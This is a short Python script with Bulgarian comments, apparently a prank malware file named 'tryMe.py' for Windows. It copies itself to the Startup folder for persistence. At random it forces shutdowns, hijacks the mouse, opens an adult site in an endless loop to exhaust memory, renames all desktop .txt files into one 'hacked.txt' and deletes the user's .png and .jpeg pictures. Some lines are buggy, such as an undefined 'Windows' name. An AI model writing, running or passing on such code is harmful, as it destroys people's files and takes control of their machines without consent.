import os
import random
import shutil
import pyautogui
import time
import webbrowser
import pathlib
import sys
import glob
from win32api import GetSystemMetrics


# Check-ва каква е операционната с-ма
def get_platform():
    platforms = {

        'linux1': 'Linux',
        'linux2': 'Linux',
        'darwin': 'OS X',
        'win32': 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform

    return platforms[sys.platform]


# Мести скрипта в старт-ъп папка на уиндолс,за да тръгва при всяко включване на компютъра
def move_to_startUp():
    pathToStartUp = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
    currentPath = pathlib.Path("tryMe.py").parent.resolve()
    shutil.copyfile(currentPath, pathToStartUp)


# Изключва компютъра
def shutdown():
    return os.system("shutdown -s -t 1")


# Мести курсора
def move_mouse():
    max_width = GetSystemMetrics(0)
    max_height = GetSystemMetrics(1)
    y_pos = random.randrange(max_width)
    x_pos = random.randrange(max_height)

    while True:
        time.sleep(1)
        pyautogui.moveTo(y_pos, x_pos)


# Как да заемем всичката рам
def nasty_uncle():
    while True:
        webbrowser.open('pornhub.com')


#Променя дир - Desktop & rename ./ .тхт -> hacked
def rename_txt():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    os.chdir(desktop)
    for file in glob.glob("*.txt"):
        os.rename(file, "hacked.txt")



#Променя дир - pictures и трие всички снимки
def delete_pictures():
    pictures = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')
    os.chdir(pictures)

    for file in glob.glob("*.png"):
        os.remove(file)

    for file in glob.glob("*.jpeg"):
        os.remove(file)



# майн функция
def main():
    haha = random.randrange(0, 8)
    os = get_platform()
    if os == Windows:
        move_to_startUp()
        if haha == 0:
            shutdown()
        elif haha == 1:
            move_mouse()
        elif haha == 2:
            nasty_uncle()
        elif haha == 3:
            rename_txt()
        elif haha == 4:
            delete_pictures()
        else:
            rename_txt()
            delete_pictures()
            move_mouse()
            time.sleep(15)
            nasty_uncle()
            time.sleep(60)
            shutdown()

    else:
        sys.exit(0)


# Питонски стандарт по конвенция пип
if __name__ == "__main__":
    main()

